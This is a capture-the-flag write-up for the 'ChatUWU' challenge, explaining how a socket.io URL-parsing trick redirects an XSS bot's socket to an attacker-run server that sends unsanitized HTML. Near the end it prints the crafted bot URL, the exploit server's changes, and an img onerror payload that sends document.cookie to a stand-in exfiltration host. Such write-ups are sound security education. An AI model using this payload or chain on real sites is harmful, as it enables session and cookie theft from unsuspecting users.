# ChatUWU

> difficulty: Normal
> I can assure you that there is no XSS on the server! You will find the flag in admin's cookie. 
> Challenge: http://47.254.28.30:58000/ XSS Bot: http://47.254.28.30:13337/ attachment

The attachment gives us the `index.js` that is running on the backend. The challenge description tells us there is an XSS Bot running and looking at that link we see that we can send the bot to a url as long as it is on the challenge server. The main challenge url leads to a website that has a chat room. Looking at the source, we see that there are different chatrooms and one of them is handled differently:

```js
<script src="/socket.io/socket.io.js"></script>

<script>
    function reset() {
        location.href = `?nickname=guest${String(Math.random()).substr(-4)}&room=textContent`;
    }

    let query = new URLSearchParams(location.search),
        nickname = query.get('nickname'),
        room = query.get('room');
    if (!nickname || !room) {
        reset();
    }
    for (let k of query.keys()) {
        if (!['nickname', 'room'].includes(k)) {
            reset();
        }
    }
    document.title += ' - ' + room;
    let socket = io(`/${location.search}`),
        messages = document.getElementById('messages'),
        form = document.getElementById('form'),
        input = document.getElementById('input');

    form.addEventListener('submit', function (e) {
        e.preventDefault();
        if (input.value) {
            socket.emit('msg', {from: nickname, text: input.value});
            input.value = '';
        }
    });

    socket.on('msg', function (msg) {
        let item = document.createElement('li'),
            msgtext = `[${new Date().toLocaleTimeString()}] ${msg.from}: ${msg.text}`;
        room === 'DOMPurify' && msg.isHtml ? item.innerHTML = msgtext : item.textContent = msgtext;
        messages.appendChild(item);
        window.scrollTo(0, document.body.scrollHeight);
    });

    socket.on('error', msg => {
        alert(msg);
        reset();
    });
</script>
```

Specifically, if we set the get parameter `room` in the url to `DOMPurify`, it will be assigning the messages to `innerHTML` instead of `textContent`. That would allow easy XSS in any message we send in the chat - except that it also has to be `msg.isHtml`, and that information comes from the server.

The relevant part of the server code: The message and nickname are truncated and *then* purified, so the truncation itself does not allow us to inject anything that DOMPurify would normally catch. 

```js
socket.on('msg', msg => {
        msg.from = String(msg.from).substr(0, 16)
        msg.text = String(msg.text).substr(0, 140)
        if (room === 'DOMPurify') {
            io.to(room).emit('msg', {
                from: DOMPurify.sanitize(msg.from),
                text: DOMPurify.sanitize(msg.text),
                isHtml: true
            });
        } else {
            io.to(room).emit('msg', {
                from: msg.from,
                text: msg.text,
                isHtml: false
            });
        }
    });
```

The `from` and `text` are independently sanitized, and then in the frontend joined together:

```js
msgtext = `[${new Date().toLocaleTimeString()}] ${msg.from}: ${msg.text}`;
```

So we thought we might be able to inject half of the javascript we want to inject into the nickname and hals into the message text, and hoped that DOMPurify would let us get away with it. It did not.



In the meantime, people started doing shenanigans on the website, but it seems most of it was just affecting the styling and not executing code. Animated text runs over the screen saying `WOW!`, amongus unicode characters `ඞ` are being spammed, fake flags are being posted by users who changed their name to `system`, porn appears, all the text goes blank, and the website starts flashing in red and black.



We noticed an inconsistency: `http://0.0.0.0:58000/?&room=DOMPurify&nickname=guest1369&room=textContent` will connect to room `textContent` but `query.get("room")` will return `DOMPurify`, and that is then used to set the `room`.
But there is still the `msg.isHtml` check :(

Dreaming a little bit: We could perhaps make the XSS Bot connect to a socket on a different domain instead. If we were to control what the socket sends to the client, we could make it send `isHtml` without being purified.

```js
 let socket = io(`/${location.search}`),
```

The `location.search` is everything in the url starting from the question mark. Above line prefixes it with a slash, so normally this refers to the root of the current domain. If we could somehow make `socket.io` ignore the starting `/?`, we could give it our own server's address, and then we could control what the bot receives from the server.

We achieve this by having an `@` in our parameter. Apparently, everything before the `@` is considered to be the username on the domain. `http://127.0.0.1:58000/?nickname=@example.com/&room=DOMPurify` is parsed as the domain `example.com/&room=DOMPurify` for the socket connection. At the same time, the get parameter `room=DOMPurify` allows us to still get into the `innerHTML` region in the client-side line of code

```js
room === 'DOMPurify' && msg.isHtml ? item.innerHTML = msgtext : item.textContent = msgtext;
```

We can now launch an exploit server that will respond to the socket connection, and send the XSS payload via the socket connection. To achieve that, we can simply:
- take the webserver code
- add these lines to accept connection cross-domain:
```js
io.engine.on("headers", (headers, req) => {
  headers["Access-Control-Allow-Origin"] = "*";
});
```
- remove the sanitazation of the message:
```js
            io.to(room).emit('msg', {
                from: msg.from,
                text: msg.text,
                isHtml: true
            });
```

Next step is to send the malicious URL to the bot. Our looked like this:
`http://[chat_server]:58000/?nickname=x@[exploit_ip]:1231/?&room=DOMPurify` (we're not sure why we need to have `?&` after our server hostname, but it didn't work when we tried to tweak it differently 😅)

Now, the bot should connect to our server from the challenge domain. Simply connect to your own server, and send an xss payload to get the cookies, such as `<img src=x onerror="fetch('https://[exfil server]/'+btoa(document.cookie))">`

Doing this, we receive a request containing base64 encoded flag!
